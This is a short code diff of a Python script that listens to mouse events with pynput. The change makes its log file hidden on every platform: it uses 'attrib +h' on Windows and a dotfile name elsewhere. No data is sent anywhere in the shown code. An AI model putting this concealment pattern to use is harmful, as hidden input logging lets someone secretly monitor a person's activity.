@@ -1,9 +1,14 @@
 import os
 from pynput.mouse import Listener
+import platform
 
-arq2 = "mouse.txt"
-open(arq2, "w")
-os.system(f"attrib +h {arq2}")
+if platform.system() == "Windows":
+    arq2 = "mouse.txt"
+    open(arq2, "w")
+    os.system(f"attrib +h {arq2}")
+else:
+    arq2 = ".mouse.txt"
+    open(arq2, "w")
 
 """def movimentacao(x,y):
     print(f"Mouse se moveu para ({x},{y})")"""
